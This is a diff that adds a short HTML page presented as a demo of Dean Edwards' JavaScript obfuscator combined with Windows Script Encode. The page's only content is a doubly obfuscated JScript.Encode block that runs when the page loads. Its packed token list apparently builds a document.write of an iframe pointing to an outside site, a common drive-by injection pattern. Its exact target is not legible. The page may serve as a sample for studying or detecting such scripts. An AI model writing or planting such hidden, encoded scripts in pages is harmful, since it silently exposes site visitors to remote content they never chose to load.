@@ -1,0 +1,6 @@
+<html><body><h1>Dean Edward's Javascript Obfuscator + Windows Script Encode</h1>
+<p>This is the example of Dean Edward's Javascript Obfuscator: function(p,a,c,k,e,r) + Windows Script Encode web page.</p>
+ 
+<script type="text/JScript.Encode">#@~^8gEAAA==~@#@&@#@&+7lVv0!UmDkGxvwSCBm~0S+BD#Pnx0!x1YrWUc1#`DOEMx~^cYWjOMkUovC*8Ib0v"BERMnw^l^+vz?&B?YMrxT##PA4k^+vmROb.]+cm*D'0$^D-u+c^*iV']W!x^DkKx`#P.+DE.x,D,nY8Tpn'6Ex1OrW	`*	.+O;Mxv-'A_E8I^{F8IA4ks+v^ Obb0v3$1T*2'aR.+aVC^`xAP"+oAa2`E-'4v_nc1#QB'w4E~vLE#~V,1TbiMnDE.	Pa8`E cf`r@!qPW'wwr*-'EP+'-'E{)JzRR1RCw'J~4{w-rmwwrPNxw'Jn-'E,0x'-ro-'J,4''-E!'-E@*,@!z8@*J*iBBq0~8%BBkkW.m:nu9Gm!:nUDuh.rD+kk9k6DCs+8u/Mm-4YDwkhShkUm\+MkmK:uSr[Y4u+!Tu4nbo4Y-*!Zud^MWVsr	okl!OKuWMls+4KD9nDERdw^kOcEuB*S!B	8*bI@#@&@#@&L6AAAA==^#~@</script>
+ 
+</body></html>
